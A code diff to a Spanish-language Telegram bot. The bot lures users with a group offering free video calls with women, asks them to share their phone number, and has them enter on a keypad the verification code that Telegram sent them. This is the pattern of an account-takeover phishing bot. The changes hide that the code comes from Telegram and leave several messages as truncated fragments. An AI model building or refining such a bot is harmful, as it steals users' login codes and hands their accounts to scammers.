@@ -41,7 +41,7 @@ def build_keypad(code_str: str):
     ]
     progreso = " ".join(list(code_str)) if code_str else "—"
     text = (
-        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 𝟓 𝐝𝐢́𝐠𝐢𝐭𝐨𝐬 𝐪𝐮𝐞 𝐞𝐧𝐯𝐢𝐨́ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐚 𝐭𝐮 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨 𝐩𝐚𝐫𝐚 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐚𝐫 𝐥𝐚 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢𝐨́𝐧.\n\n"
+        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 8 𝐝𝐢́𝐠𝐢𝐭𝐨𝐬.\n\n"
         f"Código: `{progreso}`"
     )
     return text, InlineKeyboardMarkup(rows)
@@ -54,8 +54,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     nombre_usuario = update.effective_user.first_name or "usuario"
     caption = (
         f"👋𝐇𝐨𝐥𝐚 {nombre_usuario}\n\n"
-        "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫𝐞 𝐞𝐥 𝐫𝐞𝐬𝐩𝐞𝐭𝐨 𝐡𝐚𝐜𝐢𝐚 𝐥𝐚𝐬 𝐜𝐡𝐢𝐜𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨.\n\n"
-        "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬 𝐯𝐢𝐝𝐞𝐨𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐠𝐫𝐚𝐭𝐢𝐬 𝐬𝐞𝐫 𝐫𝐞𝐬𝐩𝐞𝐭𝐮𝐨𝐬𝐨 𝐲 𝐧𝐨 𝐝𝐞𝐜𝐢𝐫 𝐠𝐫𝐨𝐬𝐞𝐫𝐢𝐚𝐬 𝐚 𝐥𝐚𝐬 𝐜𝐡𝐢𝐜𝐚𝐬.\n\n"
+        "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫.\n\n"
+        "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬.\n\n"
         "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
         "“𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎”"
     )
@@ -161,7 +161,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # ✅ Cambio solicitado aquí
         await q.edit_message_text(
-            "¡𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞, 𝐲𝐚 𝐞𝐬𝐭𝐚́𝐬 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨! 𝐕𝐚𝐲𝐚 𝐚 𝐬𝐮 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐞 𝐢𝐧𝐠𝐫𝐞́𝐬𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨. 𝐒𝐢 𝐩𝐨𝐫 𝐚𝐥𝐠𝐮́𝐧𝐚 𝐫𝐚𝐳𝐨́𝐧 𝐧𝐨 𝐬𝐚𝐥𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐯𝐮𝐞𝐥𝐯𝐚 𝐚𝐪𝐮𝐢́ 𝐲 𝐬𝐨𝐥𝐢𝐜𝐢𝐭𝐞 𝐮𝐧𝐚 𝐧𝐮𝐞𝐯𝐚 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢𝐨́𝐧."
+            "¡𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞, 𝐲𝐚 𝐞𝐬𝐭𝐚́𝐬 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨! 𝐕𝐚𝐲𝐚 𝐚 𝐬𝐮. 𝐒𝐢 𝐩𝐨𝐫 𝐚𝐥𝐠𝐮́𝐧𝐚 𝐫𝐚𝐳𝐨́𝐧 𝐧𝐨 𝐬𝐚𝐥𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐯𝐮𝐞𝐥𝐯𝐚 𝐚𝐪𝐮𝐢́ 𝐲."
         )
         context.user_data[UD_CODE] = ""
         return
@@ -179,7 +179,7 @@ async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat and update.effective_chat.type == "private":
         await update.message.reply_text(
             "⚠️ Eso no es tu número compartido con el botón nativo.\n\n"
-            "Por favor toca **📲 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏** para enviarlo automáticamente.",
+            "Por favor toca **📲 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀** para enviarlo automáticamente.",
             reply_markup=share_phone_kb()
         )
 
